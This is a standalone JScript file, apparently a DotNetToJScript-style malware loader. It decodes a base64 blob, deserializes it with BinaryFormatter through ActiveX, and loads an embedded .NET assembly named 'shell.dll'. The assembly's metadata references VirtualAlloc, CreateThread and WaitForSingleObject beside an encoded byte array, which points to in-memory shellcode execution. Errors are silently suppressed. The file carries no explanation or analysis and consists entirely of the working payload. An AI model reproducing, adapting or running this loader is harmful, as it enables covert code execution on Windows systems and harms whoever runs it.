function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9"+
"uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbG"+
"VnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ"+
"2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5m"+
"b1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkDAAAACQQAAAAEAgAAADBTeXN0ZW0uRGV"+
"sZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYX"+
"NzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZ"+
"XRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlh"+
"bGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJ"+
"lbW90aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcn"+
"Npb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhN"+
"WM1NjE5MzRlMDg5BgcAAAAHdGFyZ2V0MAYIAAAAS21zY29ybGliLCBWZXJzaW9uPTQu"+
"MC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM"+
"0ZTA4OQYJAAAAD1N5c3RlbS5EZWxlZ2F0ZQYKAAAADUR5bmFtaWNJbnZva2UKBAMAAA"+
"AiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHd"+
"GFyZ2V0MAdtZXRob2QwAwcDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIrRGVsZWdhdGVFbnRyeQIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1Nlcml"+
"hbGl6YXRpb25Ib2xkZXIJCwAAAAkMAAAACQ0AAAAEBAAAAC9TeXN0ZW0uUmVmbGVjdG"+
"lvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJse"+
"U5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2Vu"+
"ZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JCgAAAAYPAAAAS21zY29"+
"ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG"+
"9rZW49Yjc3YTVjNTYxOTM0ZTA4OQkJAAAABhEAAAAsU3lzdGVtLk9iamVjdCBEeW5hb"+
"WljSW52b2tlKFN5c3RlbS5PYmplY3RbXSkGEgAAACxTeXN0ZW0uT2JqZWN0IER5bmFt"+
"aWNJbnZva2UoU3lzdGVtLk9iamVjdFtdKQgAAAAKAQsAAAACAAAABhMAAAAgU3lzdGV"+
"tLlhtbC5TY2hlbWEuWG1sVmFsdWVHZXR0ZXIGFAAAAE1TeXN0ZW0uWG1sLCBWZXJzaW"+
"9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjN"+
"TYxOTM0ZTA4OQYVAAAAB3RhcmdldDAGFgAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAu"+
"MC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGU"+
"wODkGFwAAABpTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseQYYAAAABExvYWQKDwwAAA"+
"AAFgAAAk1akAADAAAABAAAAP//AAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5u"+
"b3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAGSGBAAAAAAAAAAAAAA"+
"AAADwACIgCwIIAAAIAAAACgAAAAAAAI4mAAAAIAAAAABAAAAAAAAAIAAAAAIAAAQAAA"+
"AAAAAABAAAAAAAAAAAoAAAAAQAAAAAAAADAECFAABAAAAAAAAAQAAAAAAAAAAAEAAAA"+
"AAAACAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAMCYAAFsAAAAAYAAA2AIAAAAAAAAAAAAA"+
"AAAAAAAAAAAAgAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAgAAAQAAAAAAAAAAAAAAAQIAAASAAAAAAAAAAAAAAALnRleH"+
"QAAACaBgAAACAAAAAIAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5zZGF0YQAAlAIAAABAA"+
"AAABAAAAAwAAAAAAAAAAAAAAAAAAEAAAMAucnNyYwAAANgCAAAAYAAAAAQAAAAQAAAA"+
"AAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAIAAAAACAAAAFAAAAAAAAAAAAAAAAAA"+
"AQAAAQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwJgAAAAAAAAAAAAAAAAAASAAAAAIABQDQI"+
"AAAVAUAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAEzAGAGEAAAABAAARAigCAAAKIJQCAACNAwAAASXQAQAABCgDAAA"+
"KCgaOaQt+BAAACiAAEAAAIAAwAAAfQCgCAAAGDAYWCAcoBQAACn4EAAAKFgh+BAAACh"+
"Z+BAAACigDAAAGDQkVKAQAAAYmKgAAAAAAAAAAAAAAQlNKQgEAAQAAAAAADAAAAHY0L"+
"jAuMzAzMTkAAAAABQBsAAAA+AEAACN+AABkAgAAYAIAACNTdHJpbmdzAAAAAMQEAAAI"+
"AAAAI1VTAMwEAAAQAAAAI0dVSUQAAADcBAAAeAAAACNCbG9iAAAAAAAAAAIAABBXlQI"+
"0CQIAAAD6ATMAFgAAAQAAAAsAAAAEAAAAAQAAAAQAAAAMAAAABwAAAAMAAAABAAAAAQ"+
"AAAAEAAAADAAAAAQAAAAEAAAABAAAAAQAAAAAAVAIBAAAAAAAGABQAKAAGACABJwEGA"+
"C4BJwEGAJEBoAEGANABJwEGANYBJwEGAOkBJwEGAPUBKAAGAAICoAEGAB0CJwEGAC0C"+
"oAEAAAAAAQAAAAAAAQABAAEAEAAKAAAACQABAAEAgAEQADMBAAAJAAEABQALARAAUgE"+
"AACkAAgAFADMBYQEQAFggAAAAAIYYRwAMAAEAAAAAAIAAkSBNADUAAQAAAAAAgACRIJ"+
"MAPQAFAAAAAACAAJEg9QBHAAsAAAABAGcAAAACAHEAAAADAHgAAAAEAIkAAAABAKAAA"+
"AACALMAAAADAL8AAAAEAM4AAAAFANoAAAAGAOoAAAABAAkBAAACABEBCQBHAAEAEQBH"+
"AAwAIQDAARQAOQDwARwAQQD9AR8ASQBHAAwAWQBHAAwALgA7AE0AQwALAAYAYwAzACg"+
"AAQCUAgAABAAtAFoAQQEFAE0AAQAAAQcAkwABAAABCQD1AAEAAEAAAAEABIAAAAAAAA"+
"AAAAAAAAAAAAAAJwIAAAQAAAAAAAAAAAAAAGwASwIAAAAABAADAAAAADxNb2R1bGU+A"+
"FRlc3RDbGFzcwBDb21WaXNpYmxlQXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLkludGVy"+
"b3BTZXJ2aWNlcwAuY3RvcgBWaXJ0dWFsQWxsb2MAa2VybmVsMzIuZGxsAGxwQWRkcmV"+
"zcwBkd1NpemUAZmxBbGxvY2F0aW9uVHlwZQBmbFByb3RlY3QAQ3JlYXRlVGhyZWFkAG"+
"xwVGhyZWFkQXR0cmlidXRlcwBkd1N0YWNrU2l6ZQBscFN0YXJ0QWRkcmVzcwBscFBhc"+
"mFtZXRlcgBkd0NyZWF0aW9uRmxhZ3MAbHBUaHJlYWRJZABXYWl0Rm9yU2luZ2xlT2Jq"+
"ZWN0AGhIYW5kbGUAZHdNaWxsaXNlY29uZHMAT2JqZWN0AFN5c3RlbQBCeXRlADxQcml"+
"2YXRlSW1wbGVtZW50YXRpb25EZXRhaWxzPgAkQXJyYXlUeXBlPTY2MAAkZmllbGQtOD"+
"kwM0Y3RTVGNTM4REUzNzAyOEJDMjVEQjJFNTQxNUQ2NjY2MEI2NQBSdW50aW1lSGVsc"+
"GVycwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAEluaXRpYWxpemVBcnJh"+
"eQBBcnJheQBSdW50aW1lRmllbGRIYW5kbGUASW50UHRyAFplcm8ATWFyc2hhbABDb3B"+
"5AENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAFZhbHVlVHlwZQBzaGVsbABSdW50aW"+
"1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBtc2NvcmxpYgBzaGVsbC5kbGwAAAAAAyAAA"+
"AAAALYLJQxYQjpInufAJcaRH18ABCABAQIFAQABAAADIAABAwYREAcAAgESFREZAgYY"+
"CAAEAR0FCBgIBAEAAAAHBwQdBQgYGAcABBgYCQkJCQAGGBgJGBgJGAUAAgkYCR4BAAE"+
"AVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIt3pcVhk04IkAAAAAAAAAAAAAAAAAAA"+
"BYJgAAAAAAAAAAAAB+JgAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcCYAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAASKEAIEAA"+
"AAAAAP/gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAN5qocbSyu4iIiJjc2NycGoT8EdqqXBCc3RqqXA6aqlwAmotlWho"+
"aqlQcm8T62oT4o4eQ14gDgJj4+svYyPjwM9wY3NqqXACqWAeaiPyRKNaOikgLadQIiI"+
"iqaKqIiIiaqfiVkVqI/JyqWo6ZqliAmsj8sF0at3rY6kWqm8T62oj9GoT4o5j4+svYy"+
"PjGsJX024hbgYqZxvzV/p6ZqliBmsj8kRjqS5qZqliPmsj8mOpJqpqI/JjemN6fHt4Y"+
"3pje2N4aqHOAmNw3cJ6Y3t4aqkwy2nd3d1/ahP5cWucVUtMS0xHViJjdGqrw2vl4G5V"+
"BCXd93FxaqvDcXhvE+JvE+txcWuYGHRbhSIiIiLd98oyIiIiExsQDBMUGgwQFxEMExA"+
"aInhqq+Nr5eKZIyIibxPrcXFIIXFrmHWrveQiIiIi3ffKSiIiIg1GZUwRfUxVc3RtEk"+
"BSYFNPREtbVnVFZRVvfVBGRRtKFxBvSG5GV0VKRk4UFUVbElNhTkcQT0xqSBFUYXpqU"+
"Bd7Y3NDaBpvelV2R0xMc2xHVXVvemMPc3B7bVdMa0hOaEQaUnFSbmYiaqvjcXhjem8T"+
"63FqmiIQiqYiIiIicnFxa+XgyXcMGd33aqvkSCh9aqvTSD14cEqiESIia6vCSCZje2u"+
"YV2S8pCIiIiLd928T4nF4aqvTbxPrbxPrcXFr5eAPJDpZ3fen4lc9auXjqjEiImuYZt"+
"IXwiIiIiLd92rd7VYgyYjKdyIiInF7SGJ4a6vz48Aya+XiIjIiImuYeoZxxyIiIiLd9"+
"2qxcXFqq8Vqq9Nqq/hr5eIiAiIia6vba5gwtKvAIiIiIt33aqHmAqfiVpBEqSVqI+Gn"+
"4lfweuF6SCJ7mcI/CChjq/jd9wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAA"+
"ABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEg"+
"AAABYYAAAgAIAAAAAAAAAAAAAgAI0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATg"+
"BGAE8AAAAAAL0E7/4AAAEAAAAAAAAAAAAAAAAAAAAAAD8AAAAAAAAABAAAAAIAAAAAA"+
"AAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQA"+
"cgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAfwCwBOABAAABAFMAdAByAGkAbgBnAEYAaQB"+
"sAGUASQBuAGYAbwAAALwBAAABADAAMAA3AGYAMAA0AGIAMAAAABwAAgABAEMAbwBtAG"+
"0AZQBuAHQAcwAAACAAAAAkAAIAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAACAAA"+
"AAsAAIAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAAB"+
"AEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAACwABgABAEk"+
"AbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAcwBoAGUAbABsAAAAKAACAAEATABlAGcAYQ"+
"BsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAACwAAgABAEwAZQBnAGEAbABUAHIAYQBkA"+
"GUAbQBhAHIAawBzAAAAAAAgAAAAPAAKAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUA"+
"bgBhAG0AZQAAAHMAaABlAGwAbAAuAGQAbABsAAAAJAACAAEAUAByAG8AZAB1AGMAdAB"+
"OAGEAbQBlAAAAAAAgAAAAKAACAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAA"+
"AAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"ACAAAAwAAACQpgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAABDQAAAAQAAAAJGAAAAAYZAAAAS21zY29ybGliLCBWZXJzaW9uPTQuM"+
"C4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0"+
"ZTA4OQkXAAAABhsAAAAnU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkgTG9hZChCeXR"+
"lW10pBhwAAAAuU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkgTG9hZChTeXN0ZW0uQn"+
"l0ZVtdKQgAAAAKCwAA";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}